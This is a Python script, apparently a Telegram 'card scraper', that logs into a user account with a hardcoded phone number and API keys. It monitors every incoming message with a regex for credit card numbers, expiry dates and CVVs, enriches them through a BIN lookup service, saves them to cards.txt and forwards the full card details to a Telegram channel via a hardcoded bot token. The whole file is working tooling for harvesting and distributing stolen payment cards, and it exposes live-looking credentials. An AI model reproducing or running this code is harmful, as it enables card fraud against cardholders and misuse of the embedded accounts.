from telethon.sync import TelegramClient, events
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
import re, requests, random

number = '529212557490'
client = TelegramClient(f'SCRAPPER Sxth',28273389, '2de1e345761a36b5de17726d4e60eee5')
client.start(number)

api_url = 'https://api.telegram.org/bot5927999033:AAG670seZByPA4bHywWhmUyJOcFVzCDqIu0/sendMessage'
regex = r'\d{14,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}|\d{13,16}[x]*|\d{14,16} \d{1,2}/\d{2,4} \d{3,4}'

# Crea un conjunto para almacenar la información de tarjetas procesadas
tarjetas_procesadas = set()

@client.on(events.NewMessage())
async def handler(event):
    mensaje_obtenido = event.message.message
    tarjetas = re.findall(regex, mensaje_obtenido)
    if tarjetas:
        for tarjeta in tarjetas:
            print(f'Tarjeta encontrada: {tarjeta}')  # Imprime la tarjeta para depurar
            cc = tarjeta.split('|')
            info_tarjeta = f'{cc[0]}|{cc[1]}|{cc[2]}'
            
            # Verifica si la tarjeta ya ha sido procesada
            if info_tarjeta not in tarjetas_procesadas:
                tarjetas_procesadas.add(info_tarjeta)  # Agrega la tarjeta al conjunto de tarjetas procesadas

                if len(cc) > 2:
                    extra = f'{cc[0][:12]}xxxx|{cc[1]}|{cc[2]}'
                else:
                    mes = random.randint(1, 12)
                    año = '202' + str(random.randint(4, 9))
                    mes = '0' + str(mes) if mes < 10 else str(mes)
                    extra = f'{tarjeta[:12]}xxxx|{mes}|{año}'
                    
                info_bin = requests.get(f'https://bins.antipublic.cc/bins/{tarjeta[:6]}').json()
                tipo_tarjeta = info_bin.get('type', 'Tipo no disponible')  # Obtiene el tipo de tarjeta o establece "Tipo no disponible" como valor predeterminado
                
                # Plantilla completa de texto
                plantilla = f'''
                


   ↳ <b>Card</b>: <code>{tarjeta}</code>
   ↳ <b>Extra</b>: <code>{extra}</code>
   ↳ <b>Type</b>: <code>{info_bin.get('brand', 'Modelo no disponible')}</code> <code>{tipo_tarjeta}</code> <code>{info_bin.get('level', 'Nivel no disponible')}</code>
   ↳ <b>Bank</b>: <code>{info_bin.get('bank', 'Banco no disponible')}</code>
   ↳ <b>Country</b>: <code>{info_bin.get('country_name', 'Nombre del país no disponible')}</code>   -   {info_bin.get('country_flag', 'Bandera del país no disponible')}<code> - {info_bin.get('country_currencies', ['Moneda no disponible'])[0]}</code>
'''
                # Agrega la tarjeta al archivo cards.txt
                with open('cards.txt', 'a') as archivo_tarjetas:
                    archivo_tarjetas.write(info_tarjeta + '\n')

                payload = {
                    'chat_id': -1001835706226,  # Reemplaza con el chat_id correcto como número entero
                    'text': plantilla,
                    'parse_mode': 'HTML'
                }
                requests.get(api_url, data=payload)

client.run_until_disconnected()